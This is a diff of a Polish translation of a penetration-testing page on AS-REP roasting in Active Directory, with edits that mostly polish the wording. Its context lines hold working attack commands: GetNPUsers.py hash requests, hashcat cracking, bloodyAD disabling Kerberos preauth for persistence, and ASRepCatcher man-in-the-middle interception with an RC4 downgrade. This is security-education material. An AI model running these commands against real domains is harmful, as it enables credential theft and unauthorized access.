@@ -54,7 +54,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 ```
 #### Żądanie wiadomości AS_REP
 
-{% code title="Using Linux" %}
+{% code title="Używając Linuksa" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -81,7 +81,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Utrzymywanie
 
-Wymuś **preauth** nie wymagany dla użytkownika, gdzie masz uprawnienia **GenericAll** (lub uprawnienia do zapisywania właściwości):
+Wymuś **preauth**, gdy nie jest wymagany dla użytkownika, gdzie masz uprawnienia **GenericAll** (lub uprawnienia do zapisu właściwości):
 
 {% code title="Using Windows" %}
 ```bash
@@ -97,7 +97,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 
 ## ASREProast bez poświadczeń
 
-Atakujący może wykorzystać pozycję man-in-the-middle, aby przechwycić pakiety AS-REP podczas ich przesyłania przez sieć, nie polegając na wyłączeniu wstępnej autoryzacji Kerberos. Działa to zatem dla wszystkich użytkowników w VLAN.\
+Atakujący może wykorzystać pozycję man-in-the-middle, aby przechwycić pakiety AS-REP, gdy przemieszczają się w sieci, nie polegając na wyłączeniu wstępnej autoryzacji Kerberos. Działa to zatem dla wszystkich użytkowników w VLAN.\
 [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) pozwala nam to zrobić. Co więcej, narzędzie zmusza stacje robocze klientów do używania RC4, zmieniając negocjację Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
@@ -117,10 +117,10 @@ ASRepCatcher listen
 
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Dołącz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serwera, aby komunikować się z doświadczonymi hackerami i łowcami bugów!
+Dołącz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hackerami i łowcami bugów!
 
 **Hacking Insights**\
-Zaangażuj się w treści, które zagłębiają się w emocje i wyzwania związane z hackingiem
+Zaangażuj się w treści, które zgłębiają dreszczyk emocji i wyzwania związane z hackingiem
 
 **Real-Time Hack News**\
 Bądź na bieżąco z dynamicznym światem hackingu dzięki wiadomościom i spostrzeżeniom w czasie rzeczywistym
